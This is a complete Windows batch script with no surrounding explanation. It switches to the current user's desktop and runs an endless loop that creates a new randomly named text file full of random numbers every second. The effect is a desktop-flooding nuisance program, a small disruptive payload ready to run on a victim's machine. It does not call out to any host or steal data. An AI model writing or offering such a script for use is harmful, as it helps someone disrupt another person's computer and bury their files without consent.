@echo off
cd %USERPROFILE%\desktop
:loop
timeout /nobreak 1 > nul
echo %random%%random%%random%%random%%random%%random%%random%%random% > %random%%random%%random%%random%%random%.txt
goto :loop
